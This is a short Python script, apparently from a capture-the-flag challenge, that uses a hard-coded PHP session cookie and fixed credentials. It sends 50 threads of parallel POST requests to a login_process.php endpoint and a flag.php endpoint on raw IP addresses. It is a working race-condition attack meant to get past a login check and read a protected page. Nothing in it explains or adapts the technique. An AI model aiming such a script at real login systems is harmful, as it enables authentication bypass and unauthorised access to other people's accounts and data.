import requests
import threading
from concurrent.futures import ThreadPoolExecutor

url = "http://34.40.48.76:32482/login_process.php"

urls = [
    "http://34.185.212.126:31011/login_process.php",
    "http://34.185.212.126:31011/flag.php"
]



username = "max"
password = 33

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Cookie": "PHPSESSID=0c13f42c76ff0fe9334fecb5d3f92f43"
}

data = {
        "username": username,
        "password": password
    }


def try_pass(url):
    try:
        res = requests.post(url, data=data, headers=headers, allow_redirects=True)
        print(res.text)
    except Exception as e:
        print('Error', e)
        
MAX_THREADS = 50

TOTAL_REQ = 50

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    for _ in range(TOTAL_REQ):
        executor.map(try_pass, urls)



